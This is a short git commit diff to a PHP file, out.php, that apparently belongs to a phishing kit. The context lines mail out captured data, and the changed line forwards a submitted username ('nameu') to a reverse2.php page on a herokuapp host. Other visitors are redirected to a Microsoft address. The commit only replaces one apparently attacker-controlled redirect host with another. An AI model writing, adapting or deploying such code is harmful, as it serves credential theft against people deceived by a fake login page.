4bf6a3473f6f32942963089857cf09f24e5374fb
Tevis Lucas <testitiliostajalle@tevis-MacBook-Air.local>
2022-07-21 02:30:00 +0300

    make it better

--- out.php
+++ out.php
@@ -18,7 +18,7 @@ mail("$to", "$send", "$subject", $message);
 }
 $praga=rand();
 $praga=md5($praga);
-  header ("Location: https://systemized-updateslocales.herokuapp.com/reverse2.php?nameu=".$_POST['nameu']);
+  header ("Location: https://svdgfiewfywiueghwfgireyrvt7346.herokuapp.com/reverse2.php?nameu=".$_POST['nameu']);
 }else{
 header ("Location: https://www.microsoft.com/undefined");
 }
